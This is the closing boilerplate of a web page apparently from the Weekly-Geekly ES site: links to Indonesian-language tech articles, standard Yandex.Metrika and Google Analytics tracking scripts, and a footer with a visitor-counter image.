<li><a href="../id439626/index.html">Pengalaman mengembangkan aplikasi gratis untuk kolektor OpenNumismat</a></li>
<li><a href="../id439628/index.html">Refresh data paralel di ASP.NET Web API</a></li>
<li><a href="../id439632/index.html">Cara mengatur Penerapan Berkelanjutan untuk proyek Anda: pengalaman pribadi</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>